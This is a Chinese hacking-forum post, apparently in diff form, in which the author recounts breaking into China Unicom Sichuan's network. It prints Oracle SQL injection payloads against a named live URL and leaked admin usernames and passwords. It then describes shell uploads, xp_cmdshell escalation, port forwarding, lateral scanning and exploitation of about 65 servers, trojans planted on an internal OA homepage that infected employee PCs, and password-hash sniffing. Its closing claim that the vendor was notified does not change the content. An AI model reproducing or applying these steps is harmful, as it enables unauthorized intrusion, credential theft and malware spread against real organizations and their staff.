@@ -1,0 +1,102 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+渗透中国联通 首发
+D8888D主贴内容-------------------------------------------------------
+渗透中国联通
+
+文章作者:Nicholas
+
+渗透联通之旅,原来入侵过四川联通.
+今日再次看看.发现一个jsp页面的get连接.就忍不住的想测试
+[url=http://www.sc.chinaunicom.com/local/content.jsp?localid=9]链接标记http://www.sc.chinaunicom.com/local/content.jsp?localid=9[/url]
+先加上  and 1=1   , and 1=2 . 貌似有注入.
+普遍情况下,JSP相对采用SYBASE,MYSQL,ORACLE数据库.那就一个个测试吧.
+
+当测试Dual表的时候返回正确了 And 0<>(select count(*) from dual)
+说明是Oracle数据库.  现在数据库已经弄清楚了,可以使用order by来测试字段了.
+order by 10-- 返回错误.  接着order by 6的时候返回正确. order by 7返回错误. 
+说明6个字段. 现在构造查询语句. 其实跟MYSQL手工注入差不多
+and  1=1 null,null,null,null,null,null from dual-- 返回错误页面.
+然后把null加上单引号测试字符类型. 还是错误页面.  
+还剩下一种常用数据类型. 那就是数字了.
+and 1=2 union select 1,'2',3,'4',5,'6' from dual--
+在新闻标题和新闻内容出现了"2"   已经爆出了数据库字段位置了.
+先看看数据库版本吧.
+and 1=2 union select 1,'(select banner from sys.v_$version where rownum=1)',3,'4',5,'6' from dual--
+返回页面出现  Oracle9i Enterprise Edition Release 9.2.0.1.0 - 64bit Production 
+然后使用(select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual)来爆数据库用户名吧
+用户名爆出来了CHINAUNICOM 
+接着通过logfile函数获取日志文件路径.(select member from v$logfile where rownum=1)
+出现/oracle/oradata/uniscdb/redo03.log   看这个路径,说明不会是WIN系统平台.是LINUX或许UNIX或许其他的
+玩过注入的朋友,都知道注入猜表都是 select * from [table] 那么来一个个测试.相当于盲注
+或许有人会说MSSQL的多句查询在显错状态下可以直接爆出表名. 但是有拓展延伸性的.
+接着就是ORACLE发挥自己强大之处的地方了.
+and 1=2 union select 1,TABLE_NAME,3,'4',5,'6' from USER_TABLES--
+出现了很多表 
+MOBILE_AREA SMS_DELIVER SMS_DELIVER_LOG SMS_REPORTMSG …………
+经过5分钟查阅，终于找到管理员表了。
+[url=http://www.sc.chinaunicom.com/local/content.jsp?localid=9]链接标记http://www.sc.chinaunicom.com/local/content.jsp?localid=9[/url] and 1=2 union select 1,NAME,3,'4',5,'6' from UNICOM_USER--
+管理员账号 123 kf_jlb sa sichuan zhangyl 
+接着NAME换成PASSWORD爆出密码
+123 kf_jlb mb747576 sa 
+通过一些工具找到后台登陆的地方了。
+[url=http://www.sc.chinaunicom.com/manage/login.do]链接标记http://www.sc.chinaunicom.com/manage/login.do[/url]
+现在进去看看吧。
+登陆成功。 既然进去了,就尝试拿拿shell吧.  
+大家一定要开VPN.否则后果很严重.
+通过新闻添加的NC提交，拿到一个shell.继续渗透之路
+首先看看系统版本吧.  
+用uname命令.回显是 SUN OS 5.9
+WEB路径 /bea/user_projects/domains/unicom_business/
+因为系统版本无exploitz，估计本地溢出很渺茫
+在WEB上级目录发现一个OA_SYSTEM_DATASCRIP目录
+进去看看吧,反正也不知道该如何是好.
+人品真的很好,竟然让我找到一个jar数据封装包.
+里面写着一台IP为 172.0.25.33的MSSQL服务器SA账号密码
+有这个就好办了.连接上去,随便建立一个库,一个表一个字段
+里面随便写个值,构造一个注入点放到四川联通WEB目录下.
+拿起工具直接注射过去.获得一些信息.数据库版本mssql2000
+权限SA，用户DBO，数据库TEST，多句执行:YES，显错开启。
+JSP+MSSQL敢用SA,第一次见。太犀利了。
+直接用xp_cmdshell提权.竟然还真提起来了.转发3389失败了
+问题来了.服务器是在172.0.25.X的内网.3389又连不上
+正在想是不是3389给过滤了.因为netstat -an看了一下
+MSSQL与几台119.6.253.X的几台服务器是监听状态
+转发不行,干脆来点狠的.直接通过XP_CMDSHELL改了3389端口
+因为是2003,不需要重启.继续做了端口转发.
+然后我本机的htran有提示连接了.
+打开mstsc连接 127.0.0.1:13389 
+出现了可爱的Windows 2003 datacenter Server登陆界面
+进去以后在硬盘里面翻了一下，发现是一台专业数据服务器
+输入ipconfig /all看了下。吓我一跳。
+3个连接
+192.168.50.4
+172.0.25.33
+10.0.30.42
+这下估计有得渗透了,挂起X-SCAN先扫描192.168.50.X网段。
+其中192.168.50.[39,43,44,49] 存在MSSQL SA空口令.轻松拿到权限.
+其中192.168.50.[23,27]存在IIS写权限漏洞.直接用老兵工具拿到两个shell.
+192.168.50,23服务器上是联通秘书运营OA平台. COUNT目录下有个计数器.
+每天有一些10.0.23.X-10.0.27.X的客户端登陆这个OA平台.凭感觉断定这些是联通职员的工作客户端.
+以前去中国移动交话费的时候,有几次不经意的看到营业厅的客户端上是XP系统，而且都没安装杀毒软件。
+三款网页组合木马,先本地测试看看是否会造成客户端卡屏或者程序bug.
+测试完成后,在OA首页挂了代码.果然是好RP.一小时过后,慢慢的有23台肉鸡上线.
+看了下远程桌面,好像也没什么特别的,只是开了中国联通业务WEB在线作业平台.可能是客服部门的吧.
+在192.168.50.39上开着cain,放那里没管它.
+继续回到192.168.50.4上面做渗透. 拿起X-SCAN扫描172.0.25.X子段.
+扫到一台LINUX 172.0.25.68上面有个网站是默认的IP URL.index.php存在remote include file漏洞
+在数据库服务器安装了php环境,放了一个php马.然后再172.0.25.68上远程包含利用成功获得shell.
+进去后才知道是四川联通的客户信息管理系统.好淫荡的想法来了.也是此次渗透最关键的地方.
+马上得到oracle账号密码,连接上去读取管理员账号密码.结果我淫荡的想法被破灭了
+网站是C/S模式的,有独立HTTPS个人证书.也就意味着HASH也是无法破解的,因为管理用户是独立的HASH SID.
+返回到192.168.50.39上面,抓到一些hash和一些明文密码.试着在线破解.有几个密码破解出来了.
+登陆上去继续提权.渗透到这个地方告一段落.
+这次渗透总共获得65台服务器权限,包括2个域管理权限.
+内网安全一塌糊涂,特别是群集的网段需要特别注意密码安全,否则一击即中.
+在入侵中,需要多出运用新的思路.翻看教程没有错,但是完全照抄就是SB了.
+
+在本次入侵检测后,我已经通知四川联通技术部门处理这些安全漏洞。
+植入的木马和后门已经协助四川联通技术部删除.在这里感谢sLock提供的三款网页木马。
+请各位看官要切记，善于利用自己的技术来帮助他人，不要非法入侵做一些损人不利己的事情。
+如有转载此文，请注明原创文章作者:Nicholas  QQ:97555711. 请尊重他人劳动成果.
